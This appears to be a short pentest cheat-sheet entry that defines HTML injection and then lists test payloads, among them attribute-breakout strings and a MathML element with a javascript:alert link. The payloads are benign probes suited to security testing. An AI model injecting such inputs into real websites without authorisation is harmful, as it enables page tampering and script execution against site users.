HTML injection is a type of injection vulnerability that occurs when a user is able to control an input point and is able to inject arbitrary HTML code into a vulnerable web page. This vulnerability can have many consequences, like disclosure of a user’s session cookies that could be used to impersonate the victim, or, more generally, it can allow the attacker to modify the page content seen by the victims.

```
"><html>test</html>

"><htm>test</htm>

"><h1>test</h1>

"><h1><a href ="http://example.com/">TEST</a></h1>

</br><h1>TEST</h1><img src="http://bing.com/"></br><h1>Test2</h1></br>

<math><maction actiontype="statusline#http://bing.com" xlink:href="javascript:alert(9)">CLICKME</maction></math>

"/><h1>test</h1>

"><b>negrita</b>
```